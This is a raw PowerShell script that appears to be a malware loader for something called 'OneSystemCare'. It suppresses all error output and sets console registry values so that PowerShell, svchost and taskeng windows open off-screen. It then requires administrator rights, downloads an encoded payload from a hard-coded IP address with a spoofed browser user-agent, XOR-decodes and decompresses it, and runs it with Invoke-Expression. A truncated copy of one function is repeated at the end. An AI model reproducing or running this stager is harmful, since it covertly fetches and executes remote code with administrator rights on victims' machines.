$ErrorActionPreference="stop"
$sc="SilentlyContinue"
$WarningPreference=$sc
$ProgressPreference=$sc
$VerbosePreference=$sc
$DebugPreference=$sc
function sr($p){$n="WindowPosition"
try{New-Item -Path $p.Out-Null
}catch{}try{New-ItemProperty -Path $p -Name $n -PropertyType DWORD -Value 201329664.Out-Null
}
catch{try{Set-ItemProperty -Path $p -Name $n -Value 201329664.Out-Null
}catch{}}}sr("HKCU:\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe")
sr("HKCU:\Console\%SystemRoot%_System32_svchost.exe")
sr("HKCU:\Console\taskeng.exe")
$surl="http://167.99.224.34/u/a=dnUuhQCP-x1ijYOqZfUkpY-WEy9scDU_97IKOby0vmQdJlVNG-yq-Cm7Kj4HeBJNvc8xWObHWfzMSvAbP16cAf4uSdq724li7eeI7CS08mjyMN8Ujtyp7O-bDESPuXqTdZ77wwRwY-VTKf80p6PwtfuK0aMYc0L-tBbTF-kwSM0BqJcszCcUGNWhEtkG___MvAWx7qIbf4VMW1stnCYj6_lZr60i4GrWhO3cn0kWYyIRjODRyrQu61h_peXM1JQ2sGyWV8hK5ySTXLq-zDkxwvhYGdc3CfoDGm-w3UrnTKSwXM5iO-z4Tjkkp5CnAtHDVxCbjxFXwfW4boeZA4eF6fv99vRs9OTjyRnQqP1EMhzeVzIOGlRqf0ON_jVrrn46-umMyTMYeEBG2FeElMzsvPE70BDFLu3aY9Lp2WLXlp4kESd6Ae7FjykW6GzVjxTVdeWm6-thQVQtasw6YeyYus9N2OqqaDUr2j7pwcjJ2HGsqJfDctjcLLVCuOdgUgnUO6rDOnVrjbUeu2xRqm60VCowaUfhnWqGSed8hp3CPtGpAnFMwtPGwNo8NC7hp5pJzj3_hMOBy0EudVgnLKZl8_NMH_fmGltZxcZ1W0N20AIyahHGwZLQ4rNjcD7OpmE0-6Gl7rMWi03hjNV05b6TDOer3o2xz2H-u45mp3zZ_3gVZVTiI9OFVmj_Pdagd7hWxQKPrs0xvYvWTDz3HvjAdHzn0NB3-4DMB19p8K-s2fgXpEyE05sz-UYmX0b7uNof3lNjrJBtvPfK_mIKZ4MusV49wdR_4G9aYZn-ztmzhm5BxvVociB23W-knb6fbTZ3yr8BXlMYdBa-4v2SvzccyBTu9TEDA1R-e9d9qNnlrR9_E7PieFYXLzg6xgrVXdWL&c=rnzWFPNP-zjRWv-Jfo2l6V80C1G3KGGOLSKBpuhY8E5ig4XJpC20vAzMBlG5l-GUyFbTyItndeBKkIADyYUGPvXIXiqRDCSB171vqE8pa2nBx2UJHuPuI1BNR7y4RPfZUbRLnlfhA9WlugRDzcJOzpHO4UKUHdhWeFmctMeG-HIrb3iI0PNYs0M_FmrYGY--SdTmREdzVKwb453QnRuiwPHlf_sIiTZRz7dvR_qV9lAXZJlqBy4c1-wQnlx5ctrkhFDVRePS24QrnssOCkTWVVlq6C3XjzMYHXt8oDg9O2CY6wAkr2XxhGJp31HeIRBKgh7WF9FreANlUUiyA0BSM6Fn1IQVfuRrY_c6EjhnE1FxT8MOJMdxRR8wchKZvhn5CX8bEN0bJYrE-nei1akG8okRS1OxYvGpk2fVET_BGP_ZiNRMTdu6LHuAoo1SvZEFFWf_O65dm-zXvi2etYBm_SEapqW0X7hrJJCqjdxKJYES9dvsaJ_8vfPJeEDcC72Ib7qI74plL0leNJJBkgG0W97oiVg-vvA0IksWh8-ENPFgaKSGotiTgfKWFy20DgoMy2O5Rxs4xd1ZPifvfLgAi49boCYQahNfcY0nF7xsnXwXAOSHTEi2OrwQZmlE00Dgh-GUfSSWHTTn_b73HEFN_T-aqQae2ai_P53xBqCy7X6t3W4GBnOazpR1ehFqar2O8sGSpvuoqn4f8d3T427OFeqoCyQbGxXbd7uuv7yCHRQ1Ghuv-TA2zncOZllr8LGPaXhgCfIF47WQdsy74IM75pL-OhFocbcrROCDeD4wCEe7TqI5gB0xzcJ3st7CEHE15yRzCTkDCDjkafZ9Coa0QHTjwB2gP__cS8jSvxgkqbWUm_k2XJG1uL1IUb8TzlPoCujp6OVk8BABX8cOsSmBhllXB44q9CYm7J8WajrEDgh-PlAmEqWL&r=9164044092574196249"
$stsk="{787E0D47-0808-7D09-0F11-7E7A0C0A1179}"
$prid="OneSystemCare"
$inid="INNSPIQS"
try{if($PSVersionTable.PSVersion.Major -lt 2){break
}$v=[System.Environment]::OSVersion.Version
if($v.Major -eq 5){if(($v.Minor -lt 2) -AND ((Get-WmiObject Win32_OperatingSystem).ServicePackMajorVersion -lt 2)){break
}}
if(-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){break
}
function wc($url){$rq=New-Object System.Net.WebClient
$rq.UseDefaultCredentials=$true
$rq.Headers.Add("user-agent","Mozilla/4.0 (compatible
 MSIE 7.0
 Windows NT 6.1
)")
return [System.Text.Encoding]::ASCII.GetString($rq.DownloadData($url))
}
function dstr($rawdata)
{$bt=[Convert]::FromBase64String($rawdata)
$ext=$bt[0]
$key=$bt[1] -bxor 170
for($i=2; $i -lt $bt.Length; $i++)
    {$bt[$i]=($bt[$i] -bxor (($key + $i) -band 255))
}
return(New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream((New-Object IO.MemoryStream($bt,2,($bt.Length-$ext))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
}
$sc=dstr(wc($surl))
Invoke-Expression -command "$sc"
}catch{}
exit 0
function sr($p)
    {$n="WindowPosition"
        try{
            New-Item -Path $p.Out-Null
        }
        catch{}
        try{
            New-ItemProperty -Path $p -Name $n -PropertyType DWORD -Value 201329664.Out-Null
        }
